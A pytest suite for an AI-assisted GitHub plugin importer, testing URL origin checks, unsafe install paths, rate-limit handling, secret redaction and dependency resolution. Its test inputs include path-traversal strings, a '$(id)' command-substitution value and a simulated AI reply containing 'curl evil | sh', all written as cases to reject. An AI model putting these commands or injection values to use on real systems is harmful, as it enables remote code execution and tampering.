"""Discovery safety, real GitHub transport behavior and recursive import policy."""

import asyncio
import base64
from dataclasses import replace
from unittest.mock import AsyncMock

import httpx
import pytest

from modules.models import MarketPlugin, PluginImportJob, SystemSettings
from modules.plugin_ai import (
    DocumentationSource,
    ImportOptions,
    InstallationConfig,
    PluginAIInfo,
    RepositoryAnalysis,
    repository_url,
)
from services.ai_provider import AIProviderError
from services.ai_security import AIProviderConfig
from services.plugins import ai_import_runner as runner
from services.plugins import ai_import_store as store
from services.plugins import ai_install_policy as policy
from services.plugins.github_ai_client import (
    GitHubAIClient,
    GitHubAuthenticationError,
    GitHubImportError,
    GitHubRateLimitError,
    response_error,
)

URL = "https://github.com/example/plugin"
SHA = "a" * 40


def test_import_maintenance_window_defaults_and_override():
    assert ImportOptions().updated_within_days == 90
    assert ImportOptions(updated_within_days=365).updated_within_days == 365


def job(**options):
    return store.snapshot(
        PluginImportJob(
            actor_user_id=1,
            request_key="test",
            options=ImportOptions(**options).model_dump(),
            command="AI import",
        )
    )


def config():
    return AIProviderConfig(
        base_url="https://example.com/v1",
        api_key="private-test-key",
        model="test-model",
        timeout_seconds=30,
        allowlist=[],
        source="global",
    )


def analysis(**kwargs):
    return RepositoryAnalysis(
        is_plugin=True,
        title="Plugin",
        description="Test plugin",
        category="utility",
        framework="counterstrikesharp",
        installation=InstallationConfig(asset_glob="*.zip"),
        **kwargs,
    )


@pytest.mark.parametrize(
    "value",
    [
        "https://evil.test/a/b",
        "https://github.com.evil/a/b",
        "https://token@github.com/a/b",
        "https://github.com/a/b?x=1",
        "https://github.com/a/..",
        "https://github.com/a/b/tree/main",
    ],
)
def test_repository_urls_never_allow_other_origins(value):
    with pytest.raises(ValueError):
        repository_url(value)
    assert repository_url(" https://GitHub.com/OWNER/Repo.git/ ") == "https://github.com/owner/repo"


@pytest.mark.parametrize(
    "kwargs",
    [
        {"target_path": "../../etc"},
        {"target_path": "/etc"},
        {"target_path": "addons/../cfg"},
        {"source_prefix": "x\\y"},
        {"source_prefix": "$(id)"},
        {"asset_glob": "../*.zip"},
        {"target_path": "cfg/x\n"},
    ],
)
def test_model_rejects_unsafe_installation_paths(kwargs):
    with pytest.raises(ValueError):
        InstallationConfig(**kwargs)


@pytest.mark.parametrize(
    ("status", "headers", "body", "kind"),
    [
        (429, {}, "busy", GitHubRateLimitError),
        (
            403,
            {"x-ratelimit-remaining": "0", "x-ratelimit-reset": "100"},
            "denied",
            GitHubRateLimitError,
        ),
        (403, {}, "secondary rate limit", GitHubRateLimitError),
        (403, {}, "permission denied", GitHubImportError),
        (401, {}, "secret response", GitHubAuthenticationError),
        (500, {}, "secret response", GitHubImportError),
    ],
)
def test_rate_limit_is_distinguished_from_permissions(status, headers, body, kind):
    error = response_error(httpx.Response(status, headers=headers, text=body))
    assert type(error) is kind
    assert "secret response" not in str(error)
    assert response_error(httpx.Response(200, json={})) is None


@pytest.mark.asyncio
async def test_transport_stops_permanently_after_limit_and_never_leaks_token():
    requests = []

    def handle(request):
        requests.append(request)
        assert request.url.host == "api.github.com"
        assert request.headers["Authorization"] == "Bearer test-secret"
        return httpx.Response(429, headers={"retry-after": "20"}, text="sensitive upstream text")

    client = GitHubAIClient("test-secret", interval=0, transport=httpx.MockTransport(handle))
    for path in ["/user", "/rate_limit", "/search/repositories", "/repos/a/b/readme"]:
        with pytest.raises(GitHubRateLimitError) as error:
            await client.request(path)
        assert error.value.reset_at is not None
        assert "sensitive" not in str(error.value)
    for path in ["https://evil.test", "//evil.test/a"]:
        with pytest.raises(ValueError):
            await client.request(path)
    assert len(requests) == 1
    await client.close()


@pytest.mark.asyncio
async def test_token_verification_and_pinned_document_sources():
    paths = []

    def handle(request):
        paths.append(str(request.url))
        path = request.url.path
        if path == "/user":
            return httpx.Response(200, json={"login": "admin"})
        if path == "/rate_limit":
            return httpx.Response(
                200,
                json={
                    "resources": {
                        "core": {"remaining": 100, "reset": 123},
                        "search": {"remaining": 29, "reset": 124},
                    }
                },
            )
        if "/commits/" in path:
            return httpx.Response(200, json={"sha": SHA})
        if "/git/trees/" in path:
            return httpx.Response(
                200, json={"tree": [{"path": "docs/install.md", "type": "blob", "size": 100}]}
            )
        if path.endswith("/releases/latest"):
            return httpx.Response(404)
        if path.startswith("/search/"):
            assert "archived:false" in request.url.params["q"]
            assert "pushed:>=" in request.url.params["q"]
            return httpx.Response(200, json={"items": [{"html_url": URL}]})
        assert request.url.params["ref"] == SHA
        return httpx.Response(
            200,
            json={
                "path": "docs/install.md" if "/contents/" in path else "README.md",
                "encoding": "base64",
                "content": base64.b64encode(b"Install plugin archive").decode(),
            },
        )

    client = GitHubAIClient("token", interval=0, transport=httpx.MockTransport(handle))
    verified = await client.verify()
    assert verified.valid and verified.account == "admin" and verified.search_remaining == 29
    docs, sources = await client.documents({"html_url": URL, "default_branch": "main"})
    assert len(docs) == 2 and {source.commit for source in sources} == {SHA}
    assert await client.release(URL) is None
    assert await client.search(ImportOptions(), "CounterStrikeSharp") == [{"html_url": URL}]
    await client.close()


@pytest.mark.asyncio
async def test_network_json_redirect_and_response_size_fail_safely():
    from services.plugins import github_ai_client as github

    for response in [
        httpx.Response(302, headers={"location": "https://evil.test"}),
        httpx.Response(200, text="not-json"),
        httpx.Response(200, content=b"x" * (github.MAX_RESPONSE_BYTES + 1)),
    ]:
        client = GitHubAIClient(
            "token", interval=0, transport=httpx.MockTransport(lambda _, current=response: current)
        )
        with pytest.raises(GitHubImportError):
            await client.request("/user")
        await client.close()

    def network_error(request):
        raise httpx.ConnectError("private proxy credential", request=request)

    client = GitHubAIClient("token", interval=0, transport=httpx.MockTransport(network_error))
    with pytest.raises(GitHubImportError, match="Unable to connect to GitHub API"):
        await client.verify()
    await client.close()


def test_token_replacement_invalidates_verification_and_revision_changes():
    settings = SystemSettings(
        global_github_token="token",
        github_token_fingerprint=store.fingerprint("token"),
        github_token_verification={"valid": True, "account": "test"},
    )
    assert store.verification_for(settings).valid
    settings.global_github_token = "new-token"
    assert not store.verification_for(settings).valid
    settings.global_github_token = None
    assert not store.verification_for(settings).valid
    info = PluginAIInfo(model="test", installation=InstallationConfig())
    revision = info.revision()
    info.reviewed = True
    assert revision != info.revision()


@pytest.fixture
def runner_env(monkeypatch):
    monkeypatch.setattr(store, "check_job", AsyncMock())
    monkeypatch.setattr(store, "update_job", AsyncMock())
    monkeypatch.setattr(store, "existing_plugin", AsyncMock(return_value=None))
    monkeypatch.setattr(store, "insert_plugin", AsyncMock(side_effect=[10, 11, 12]))
    monkeypatch.setattr(
        GitHubAIClient,
        "repository",
        AsyncMock(
            side_effect=lambda url: {
                "html_url": url,
                "owner": {"login": "example"},
                "default_branch": "main",
            }
        ),
    )
    monkeypatch.setattr(
        GitHubAIClient,
        "documents",
        AsyncMock(
            return_value=(
                [{"path": "README.md", "text": "Requires https://github.com/example/dependency"}],
                [DocumentationSource(path="README.md", commit=SHA)],
            )
        ),
    )
    monkeypatch.setattr(
        GitHubAIClient, "release", AsyncMock(return_value={"assets": [{"name": "plugin.zip"}]})
    )
    monkeypatch.setattr(
        runner,
        "create_chat_completion",
        AsyncMock(return_value={"content": analysis().model_dump_json()}),
    )


@pytest.mark.asyncio
async def test_recursive_dependencies_reuse_existing_and_do_not_overwrite(runner_env):
    runner.create_chat_completion.return_value = {
        "content": analysis(
            dependencies=["https://github.com/example/dependency"]
        ).model_dump_json()
    }
    store.existing_plugin.side_effect = lambda url: 9 if url.endswith("dependency") else None
    instance = runner.ImportRunner(job(), "token", config())
    try:
        assert await instance.visit(URL) == 10
        args = store.insert_plugin.call_args.args
        assert args[5] == [9] and args[4].reviewed is False
        assert args[4].sources[0].commit == SHA
        assert instance.analyzed == 1
        store.insert_plugin.assert_awaited_once()
    finally:
        await instance.client.close()


@pytest.mark.asyncio
async def test_dependency_cycles_and_undocumented_urls_become_manual_requirements(runner_env):
    dependency = "https://github.com/example/dependency"
    GitHubAIClient.documents.return_value = (
        [{"path": "README.md", "text": f"{URL} {dependency}"}],
        [DocumentationSource(path="README.md", commit=SHA)],
    )
    runner.create_chat_completion.side_effect = [
        {
            "content": analysis(
                dependencies=[dependency, "https://github.com/hallucinated/plugin"]
            ).model_dump_json()
        },
        {"content": analysis(dependencies=[URL]).model_dump_json()},
    ]
    instance = runner.ImportRunner(job(), "token", config())
    try:
        assert await instance.visit(URL) == 11
        child, parent = [call.args for call in store.insert_plugin.call_args_list]
        assert "Unresolved dependency" in child[4].requirements[0]
        assert "not supported" in parent[4].requirements[0]
        assert parent[5] == [10]
        assert instance.analyzed == 2
        assert await instance.visit(URL) == 11
        assert await instance.visit("https://github.com/example/deep", depth=6) is None
    finally:
        await instance.client.close()


@pytest.mark.asyncio
async def test_invalid_ai_output_continues_but_provider_unavailability_stops(runner_env):
    instance = runner.ImportRunner(job(), "token", config())
    try:
        runner.create_chat_completion.return_value = {"content": '{"shell": "curl evil | sh"}'}
        assert await instance.visit(URL) is None
        assert store.update_job.call_args.kwargs["item"].status == "failed"
        runner.create_chat_completion.side_effect = AIProviderError("provider unavailable")
        with pytest.raises(AIProviderError):
            await instance.visit("https://github.com/example/next")
        store.insert_plugin.assert_not_called()
    finally:
        await instance.client.close()


@pytest.mark.asyncio
@pytest.mark.parametrize("failure_at", ["repository", "documents", "release"])
async def test_any_github_rate_limit_aborts_before_ai_or_insert(runner_env, failure_at):
    getattr(GitHubAIClient, failure_at).side_effect = GitHubRateLimitError(
        "rate limited", reset_at=123
    )
    instance = runner.ImportRunner(job(), "token", config())
    try:
        with pytest.raises(GitHubRateLimitError):
            await instance.visit(URL)
        runner.create_chat_completion.assert_not_called()
        store.insert_plugin.assert_not_called()
    finally:
        await instance.client.close()


@pytest.mark.asyncio
async def test_missing_release_blocks_installation_and_framework_filter_skips(runner_env):
    GitHubAIClient.release.return_value = None
    instance = runner.ImportRunner(job(), "token", config())
    try:
        await instance.visit(URL)
        info = store.insert_plugin.call_args.args[4]
        assert info.installation is None and info.requirements
        incompatible = runner.ImportRunner(job(framework="swiftly"), "token", config())
        try:
            assert await incompatible.visit(URL) is None
        finally:
            await incompatible.client.close()
    finally:
        await instance.client.close()


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("failure", "reason"),
    [
        (TimeoutError(), "timeout"),
        (GitHubRateLimitError("limited", reset_at=42), "github_rate_limit"),
        (PermissionError(), "configuration"),
        (AIProviderError("private key"), "ai_error"),
        (RuntimeError("secret"), "execution_error"),
    ],
)
async def test_terminal_jobs_retain_results_and_safe_reason(monkeypatch, failure, reason):
    monkeypatch.setattr(store, "credentials", AsyncMock(side_effect=failure))
    update = AsyncMock()
    monkeypatch.setattr(store, "update_job", update)
    await runner.run_job(job())
    assert update.call_args.kwargs["reason"] == reason
    assert "private key" not in update.call_args.kwargs["message"]
    assert "secret" not in update.call_args.kwargs["message"]


@pytest.mark.asyncio
async def test_cancel_is_terminal_and_retains_imports(monkeypatch):
    monkeypatch.setattr(store, "credentials", AsyncMock(side_effect=asyncio.CancelledError()))
    monkeypatch.setattr(
        store, "get_job", AsyncMock(return_value=replace(job(), cancel_requested=True))
    )
    update = AsyncMock()
    monkeypatch.setattr(store, "update_job", update)
    with pytest.raises(asyncio.CancelledError):
        await runner.run_job(job())
    assert update.call_args.kwargs["status"] == "cancelled"


@pytest.mark.asyncio
async def test_selected_asset_rules_read_real_archive_and_block_rule_bypass(monkeypatch):
    from services.plugin_conflict_service import validate_plugin_plan_acknowledgements
    from services.plugins import release_archive as github
    from services.plugins.common import PluginPlanError

    info = PluginAIInfo(
        model="test",
        installation=InstallationConfig(
            asset_glob="plugin-*.zip",
            source_prefix="release",
            target_path="addons/counterstrikesharp/plugins/Plugin",
        ),
    )
    plugin = MarketPlugin(title="Plugin", github_url=URL, ai_metadata=info.model_dump())
    layout = {
        "entries": [{"path": "release/plugin.dll"}],
        "mapping": [],
        "mapping_required": True,
        "source_prefix": None,
        "archive_sha256": "a" * 64,
    }
    inspect = AsyncMock(return_value=layout)
    monkeypatch.setattr(github, "inspect_release_asset_layout", inspect)
    rules = await policy.selected_asset_rules(
        plugin, URL + "/releases/download/v1/plugin-linux.zip"
    )
    assert rules["source_prefix"] == "release"
    assert rules["custom_install_path"] == info.installation.target_path
    assert rules["archive_sha256"] == "a" * 64
    for url in [URL + "/releases/download/v1/other.zip", "https://evil.test/archive.zip"]:
        with pytest.raises(PluginPlanError):
            await policy.selected_asset_rules(plugin, url)
    inspect.assert_awaited_once()
    with pytest.raises(PluginPlanError, match="acknowledgement"):
        validate_plugin_plan_acknowledgements({"ai_unreviewed": [1]}, [])
    validate_plugin_plan_acknowledgements(
        {"ai_unreviewed": [1], "hard_conflicts": [], "warnings": []},
        [],
        acknowledge_ai_unreviewed=True,
    )
    info.requirements = ["Install database manually"]
    plugin.ai_metadata = info.model_dump()
    with pytest.raises(PluginPlanError, match="unresolved"):
        policy.validate_installable(plugin)


@pytest.mark.asyncio
async def test_search_paginates_both_frameworks_sorts_and_deduplicates(runner_env, monkeypatch):
    def result(options, term, page):
        if page == 1:
            return [
                {"html_url": f"https://github.com/example/plugin{n}", "stargazers_count": n}
                for n in range(50)
            ]
        return [{"html_url": "https://github.com/example/last", "stargazers_count": 100}]

    search = AsyncMock(side_effect=result)
    monkeypatch.setattr(GitHubAIClient, "search", search)
    instance = runner.ImportRunner(job(repositories=[URL]), "token", config())
    try:
        candidates = await instance.candidates()
        assert candidates[:2] == [URL, "https://github.com/example/last"]
        assert len(candidates) == 52 and search.await_count == 4
        assert {call.args[1] for call in search.call_args_list} == {
            "CounterStrikeSharp",
            "SwiftlyS2",
        }
    finally:
        await instance.client.close()


@pytest.mark.asyncio
async def test_run_verifies_then_imports_bounded_targets_and_closes_client(runner_env, monkeypatch):
    from modules.plugin_ai import GitHubVerification

    monkeypatch.setattr(
        GitHubAIClient,
        "verify",
        AsyncMock(
            return_value=GitHubVerification(valid=True, core_remaining=100, search_remaining=29)
        ),
    )
    monkeypatch.setattr(
        runner.ImportRunner,
        "candidates",
        AsyncMock(return_value=[URL, "https://github.com/example/extra"]),
    )
    instance = runner.ImportRunner(job(max_plugins=1), "token", config())
    await instance.run()
    store.insert_plugin.assert_awaited_once()
    assert store.update_job.call_args.kwargs["status"] == "completed"
    assert instance.client._client.is_closed
    GitHubAIClient.verify.return_value = GitHubVerification(
        valid=True, core_remaining=0, core_reset=123
    )
    with pytest.raises(GitHubRateLimitError) as error:
        await runner.ImportRunner(job(), "token", config()).run()
    assert error.value.reset_at == 123
    GitHubAIClient.verify.return_value = GitHubVerification(valid=False)
    with pytest.raises(GitHubAuthenticationError):
        await runner.ImportRunner(job(), "token", config()).run()


@pytest.mark.asyncio
async def test_time_budget_cancels_inflight_external_work(runner_env, monkeypatch):
    started, stopped = asyncio.Event(), asyncio.Event()

    async def long_request(_):
        started.set()
        try:
            await asyncio.Event().wait()
        finally:
            stopped.set()

    monkeypatch.setattr(store, "credentials", long_request)
    short_job = replace(job(), options=ImportOptions.model_construct(minutes=0.0001))
    await runner.run_job(short_job)
    assert started.is_set() and stopped.is_set()
    assert store.update_job.call_args.kwargs["reason"] == "timeout"


@pytest.mark.asyncio
async def test_serial_github_and_search_spacing(monkeypatch):
    from services.plugins import github_ai_client as github

    clock = [100.0]
    monkeypatch.setattr(github.time, "monotonic", lambda: clock[0])

    async def sleep(seconds):
        clock[0] += seconds

    monkeypatch.setattr(github.asyncio, "sleep", sleep)
    times = []

    def respond(_):
        times.append(clock[0])
        return httpx.Response(200, json={})

    client = GitHubAIClient("token", transport=httpx.MockTransport(respond))
    try:
        for path in ["/user", "/search/repositories", "/repos/a/b", "/search/repositories"]:
            await client.request(path)
        assert times == [100, 102, 104, 108]
    finally:
        await client.close()


@pytest.mark.asyncio
async def test_auto_upgrade_consumes_current_market_rules_and_checked_archive(monkeypatch):
    from modules.models import ManagedPlugin
    from services.plugins import release_archive

    info = PluginAIInfo(
        model="model",
        reviewed=True,
        installation=InstallationConfig(
            asset_glob="plugin-*.zip",
            source_prefix="release",
            target_path="addons/counterstrikesharp/plugins/Plugin",
        ),
    )
    plugin = MarketPlugin(id=15, title="Plugin", github_url=URL, ai_metadata=info.model_dump())
    item = ManagedPlugin(
        id=1,
        server_id=1,
        source_type="market",
        source_key="15",
        display_name="Plugin",
        market_plugin_id=15,
        repo_url=URL,
        asset_glob="obsolete-*",
        exclude_files=["custom.cfg"],
    )
    monkeypatch.setattr(policy, "managed_market_plugin", AsyncMock(return_value=plugin))
    assets = [
        {
            "name": "plugin-linux.zip",
            "browser_download_url": URL + "/releases/download/v1/plugin-linux.zip",
        },
        {"name": "unrelated.zip"},
    ]
    selected, pattern = await policy.managed_asset_candidates(item, assets)
    assert selected == assets[:1] and pattern == "plugin-*.zip"
    monkeypatch.setattr(
        release_archive,
        "inspect_release_asset_layout",
        AsyncMock(
            return_value={
                "entries": [{"path": "release/plugin.dll"}],
                "mapping": [],
                "mapping_required": True,
                "source_prefix": None,
                "archive_sha256": "c" * 64,
            }
        ),
    )
    request = await policy.managed_install_request(
        item, {"asset": assets[0], "release_id": "v1", "version": "1"}, ["*.cfg", "*.json"]
    )
    assert request.custom_install_path == info.installation.target_path
    assert request.source_prefix == "release"
    assert request.expected_archive_sha256 == "c" * 64
    assert request.exclude_files == ["custom.cfg", "*.cfg", "*.json"]
